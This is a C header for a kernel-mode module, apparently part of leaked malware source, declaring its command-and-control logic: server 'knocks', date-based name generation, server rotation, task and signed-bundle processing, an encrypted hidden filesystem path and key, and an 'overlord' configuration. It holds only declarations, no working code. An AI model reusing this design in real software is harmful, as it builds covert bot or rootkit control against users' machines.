#ifndef __MOD_LOGICAPI_H_
#define __MOD_LOGICAPI_H_

#define TEST_URL_MAX_LEN    24
#define TEST_URL_COUNT        3
#define TEST_URL_BUFFER_LEN    TEST_URL_COUNT * TEST_URL_MAX_LEN

typedef enum
{
    KR_OK = 0x00,
    KR_NEED_NETWORK_RECONFIGURE,
    KR_NEED_NETCOMM_RECONFIGURE,
} KNOCK_RESULT;

#define BUNDLES_CHECKOUT 777
#define OVERLORD_CONF_CHECKOUT 3 * 60
#define NDIS_NET_CHECKOUT 25 * 60//3600

typedef void (*Fnlogic_obtain_system_info)();
//typedef bool_t (*Fnlogic_check_for_connection)();
typedef bool_t (*Fnlogic_validate_server_response)(netcomm_request_type nrt, uint8_t* data, uint32_t dataSize);
typedef KNOCK_RESULT (*Fnlogic_make_knock_to_server)(netcomm_request_type nrt);
typedef uint8_t (*Fnlogic_process_bundle)(uint8_t* packBuffer, uint8_t** pBundleBuffer, uint32_t* pBundleSize, uint8_t* pSha1Hash);
typedef void (*Fnlogic_process_tasks)();
typedef KNOCK_RESULT (*Fnlogic_check_bundle_updates)();
// typedef KNOCK_RESULT (*Fnlogic_send_info_to_server)();
typedef bool_t (*Fnlogic_reconfigure)(bool_t onlyNdisNet);
typedef NTSTATUS (*Fnlogic_save_config)();
typedef bool_t (*Fnlogic_read_public_key)(rsa_context_t* pRsa, uint8_t* buffer);
typedef char* (*Fnlogic_generate_name_for_date)(uint32_t unixTime);
typedef bool_t (*Fnlogic_check_for_new_period)();
typedef NTSTATUS (*Fnlogic_generate_names)();
typedef void (*Fnlogic_handle_key)(const char* key, char* val);
typedef void (*Fnlogic_reload_overlord_config)();

// typedef LIST_ENTRY* (*FnIopInterlockedInsertTailList)(LIST_ENTRY *a1, LIST_ENTRY *a2);
// typedef NTSTATUS (*FnMyIoRegisterLastChanceShutdownNotification)(PDEVICE_OBJECT DeviceObject);

typedef struct _mod_logic_private
{
    Fnlogic_obtain_system_info fnlogic_obtain_system_info;
    //Fnlogic_check_for_connection fnlogic_check_for_connection;
    Fnlogic_validate_server_response fnlogic_validate_server_response;
    Fnlogic_make_knock_to_server fnlogic_make_knock_to_server;
    Fnlogic_process_bundle fnlogic_process_bundle;
    Fnlogic_process_tasks fnlogic_process_tasks;
    Fnlogic_check_bundle_updates fnlogic_check_bundle_updates;
//     Fnlogic_send_info_to_server fnlogic_send_info_to_server;
    Fnlogic_reconfigure fnlogic_reconfigure;
    Fnlogic_save_config fnlogic_save_config;
    Fnlogic_read_public_key fnlogic_read_public_key;
    Fnlogic_generate_name_for_date fnlogic_generate_name_for_date;
    Fnlogic_check_for_new_period fnlogic_check_for_new_period;
    Fnlogic_generate_names fnlogic_generate_names;
    Fnlogic_handle_key fnlogic_handle_key;
    Fnlogic_reload_overlord_config fnlogic_reload_overlord_config;

//     FnIopInterlockedInsertTailList fnIopInterlockedInsertTailList;
//     FnMyIoRegisterLastChanceShutdownNotification fnMyIoRegisterLastChanceShutdownNotification;

    uint8_t* pModBase;

    PUNICODE_STRING langKey;
    PUNICODE_STRING langsKey;
    char alphas[16];
    //char testUrlList[TEST_URL_BUFFER_LEN]; // update.microsoft.com, windows.microsoft.com, support.microsoft.com,  
    //char* currentUrl;
    char fsPath[MAX_PATH];
    uint8_t fsKey[24];
    char overlordConfPath[64];
    int useFs;
    bool_t needChangeServer;

    uint32_t lastNtpTime;
    LARGE_INTEGER lastSystemTimestamp;

    uint32_t systemTime;
    uint32_t launcherTime;
    uint32_t checkTasksTime;
    uint32_t checkBundlesTime;
    uint32_t checkOverlordConfTime;
    uint32_t overlordConfUnixTime;
    uint32_t checkNDISAccessable;
    int rotateTimeout;
    bool_t bFirstTime;
    bool_t needCheckTasks, needCheckBundleUpdates;
    uint32_t rotateCounter;
    uint32_t failedCounter;

    //PLIST_ENTRY pIopNotifyLastChanceShutdownQueueHead;
} mod_logic_private_t, *pmod_logic_private_t;

typedef struct _mod_logic_block
{
    mod_logic_private_t;
//    mod_logic_data_t;
} mod_logic_block_t, *pmod_logic_block_t;

#endif // __MOD_LOGICAPI_H_
